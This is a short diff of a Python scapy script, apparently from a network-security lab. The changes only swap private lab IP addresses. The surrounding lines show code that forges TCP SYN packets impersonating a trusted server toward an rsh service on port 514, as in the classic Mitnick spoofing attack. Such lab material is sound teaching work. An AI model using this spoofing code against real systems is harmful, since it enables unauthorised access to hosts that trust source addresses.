@@ -1,10 +1,10 @@
 #!usr/bin/python3
 from scapy.all import *
 import sys
-X_ter_IP = "10.0.2.8"
+X_ter_IP = "10.0.2.6"
 X_ter_port = 514
 X_ter_port_2 = 1023
-T_ser_IP = "10.0.2.10"
+T_ser_IP = "10.0.2.7"
 T_ser_port = 1023
 T_ser_port_2 = 9090
 
@@ -40,7 +40,7 @@ def spoof_pkt(pkt):
 
 def spoofing_SYN():
 	print("Sending Spoofed SYN Packet ...")
-	IP_layer = IP(src="10.0.2.10", dst="10.0.2.8")
+	IP_layer = IP(src="10.0.2.7", dst="10.0.2.6")
 	TCP_layer = TCP(sport=1023,dport=514,flags="S", seq=778933590)
 	pkt = IP_layer/TCP_layer
 	send(pkt,verbose=0)
